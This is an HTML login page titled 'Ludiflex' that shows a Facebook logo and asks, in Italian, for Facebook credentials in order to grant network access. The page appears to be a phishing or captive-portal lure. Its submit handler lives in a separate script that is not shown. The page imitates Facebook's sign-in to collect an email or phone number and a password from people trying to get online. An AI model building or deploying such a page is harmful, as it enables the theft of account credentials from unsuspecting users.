<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In | Ludiflex</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-box">
		<div class="google-logo" width="74" height="24">
			<img src="facebook.png">
		</div>
        <div class="login-header">
            <header>Accesso alla rete</header>
            <p>Utiliza il tuo account Facebook</p>
        </div>
		<div class="input-area" id="input-area">
			<div class="input-box">
				<input type="text" class="input-field" id="email" autocomplete="off" required>
				<label for="email">Email or phone</label>
			</div>
			<div class="input-box">
				<input type="password" class="input-field" id="password" autocomplete="off" required>
				<label for="password">Password</label>
			</div>
		</div>
        <div class="input-box">
            <input type="submit" style="margin-top: 40px;" class="input-submit" value="Avanti" onclick="Login.submit_btn()">
        </div>
    </div>
	<script src="javascript.js"></script>
</body>
</html>
